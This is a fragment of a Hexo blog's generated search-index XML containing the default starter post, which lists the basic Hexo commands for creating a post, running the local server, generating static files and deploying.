        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
